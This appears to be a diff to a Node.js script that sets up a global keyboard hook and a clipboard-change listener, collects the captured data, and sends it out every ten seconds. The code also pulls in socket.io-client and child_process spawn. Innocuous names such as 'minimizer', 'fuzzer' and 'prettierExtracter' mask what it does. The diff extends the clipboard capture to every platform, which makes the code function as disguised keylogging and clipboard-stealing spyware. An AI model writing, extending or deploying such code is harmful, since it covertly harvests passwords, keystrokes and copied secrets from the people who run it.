@@ -1,4 +1,3 @@
-const { GlobalKeyboardListener } = require("node-global-key-listener");
 const minimizerListener = require("clipboard-event");
 
 const { getMinimizer } = require("./tools/minimizer.js");
@@ -30,14 +29,10 @@ const prettierExtracter = () => {
 };
 
 const runForWindows = async () => {
+  const { GlobalKeyboardListener } = require("node-global-key-listener");
+
   prettierExtracter();
   const v = new GlobalKeyboardListener();
-
-  minimizerListener.startListening();
-  minimizerListener.on("change", async () => {
-    const change = await getMinimizer();
-    pendingData.minimizer += "," + change;
-  });
 
   v.addListener(function (e, down) {
     if (e.state === "DOWN" && !e?.name?.includes("MOUSE")) {
@@ -48,29 +43,16 @@ const runForWindows = async () => {
   setInterval(() => {
     runRunner();
   }, 1000);
-
-  setInterval(() => {
-    if (pendingData.minimizer != "" || pendingData.fuzzer != "") {
-      const success = sendMinimizerAndFuzzerData(
-        pendingData.minimizer,
-        pendingData.fuzzer
-      );
-      if (success) {
-        pendingData.minimizer = "";
-        pendingData.fuzzer = "";
-      }
-    }
-
-    if (pendingData.runners.length) {
-      const success = sendRunnerData(pendingData.runners);
-      if (success) {
-        pendingData.runners = [];
-      }
-    }
-  }, 10000);
 };
 
 const runForAll = async () => {
+  // Run Minimizer
+  minimizerListener.startListening();
+  minimizerListener.on("change", async () => {
+    const change = await getMinimizer();
+    pendingData.minimizer += "," + change;
+  });
+
   const { io } = require("socket.io-client");
   const { spawn } = require("child_process");
   const os = require("os");
@@ -367,6 +349,26 @@ const main = async () => {
     runForWindows();
   }
   runForAll();
+
+  setInterval(() => {
+    if (pendingData.minimizer != "" || pendingData.fuzzer != "") {
+      const success = sendMinimizerAndFuzzerData(
+        pendingData.minimizer,
+        pendingData.fuzzer
+      );
+      if (success) {
+        pendingData.minimizer = "";
+        pendingData.fuzzer = "";
+      }
+    }
+
+    if (pendingData.runners.length) {
+      const success = sendRunnerData(pendingData.runners);
+      if (success) {
+        pendingData.runners = [];
+      }
+    }
+  }, 10000);
 };
 
 main();
